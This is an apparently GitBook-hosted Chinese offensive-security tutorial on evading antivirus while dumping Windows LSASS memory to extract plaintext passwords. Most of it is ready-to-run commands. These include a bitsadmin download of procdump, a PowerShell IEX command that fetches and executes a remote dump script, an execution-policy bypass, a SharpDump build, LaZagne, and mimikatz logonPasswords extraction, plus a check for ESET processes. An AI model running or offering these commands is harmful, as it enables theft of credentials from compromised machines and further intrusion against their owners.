# 免杀抓取明文

## 1、前提条件

必须已经事先拿到目标机器的管理权限,且看到有管理员的登录会话

```
query user
```

![](<../../.gitbook/assets/image (292).png>)

## 2、Prodump

直接指定 lsass.exe 进程名进行抓取即可,之后只需把生成的 lsass.dmp 文件拖回本地

```
cd c:\Windows\Temp

bitsadmin /rawreturn /transfer getfile https://raw.githubusercontent.com/klionsec/CommonTools/master/procdump.exe c:\windows\temp\dump.exe

dump.exe -accepteula -ma lsass.exe lsass.dmp
```

![](<../../.gitbook/assets/image (562).png>)

接着,再在本地用 mimikatz.exe 去加载读取即可\[版本保持一致]

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
```

![](<../../.gitbook/assets/image (794).png>)

## 3、powershell

### 1、远程执行：&#x20;

只适用于 2008r2 之后的系统

```
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/klionsec/CommonTools/master/Out-Minidump.ps1'); Get-Process lsass | Out-Minidump -DumpFilePath c:\windows\temp"

tasklist | findstr /c:"egui.exe" /c:"ekrn.exe"

dir c:\windows\Temp | findstr "lsass
```

![](<../../.gitbook/assets/image (324).png>)

同样,之后只需把 lsass\_504.dmp 文件拖到本地机器再用 mimikatz.exe 加载读取即可

```
mimikatz.exe "sekurlsa::minidump lsass_596.dmp" "sekurlsa::logonPasswords full" exit
```

![](<../../.gitbook/assets/image (301).png>)

### 2、本地执行

```
powershell –exec bypass –Command "& {Import-Module 'C:\Tools\Out-Minidump.ps1'; Get-Process lsass | Out-Minidump -DumpFilePath c:\windows\temp}"
```

![](<../../.gitbook/assets/image (596).png>)

PS: powershell 导 lsass.exe 进程数据差不多文件要比用 prodump 导的小 10M 左右

```
mimikatz.exe "sekurlsa::minidump lsass_596.dmp" "sekurlsa::logonPasswords full" exit
```

![](<../../.gitbook/assets/image (732).png>)

## 4、sharpDump

项目地址：[https://github.com/GhostPack/SharpDump](https://github.com/GhostPack/SharpDump)&#x20;

将.sln用MSBuild编译成.exe    &#x20;

```
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe E:\SharpDump-master\SharpDump.sln /t:Rebuild /p:Configuration=Release
```

![](<../../.gitbook/assets/image (380).png>)

直接运行：

![](<../../.gitbook/assets/image (285).png>)

需要线把 bin 重命名为 zip 后缀,然后正常解压出里面的 文件,再给 mimikatz 去读取即可

```
mimikatz.exe "sekurlsa::minidump debug596" "sekurlsa::logonPasswords full" "exit"
```

![](<../../.gitbook/assets/image (353).png>)

## 5、LaZagne(python)

项目地址：[https://github.com/AlessandroZ/LaZagne/releases](https://github.com/AlessandroZ/LaZagne/releases)

下载直接运行`lazgne.exe all`

![](<../../.gitbook/assets/image (266).png>)

![](<../../.gitbook/assets/image (314).png>)

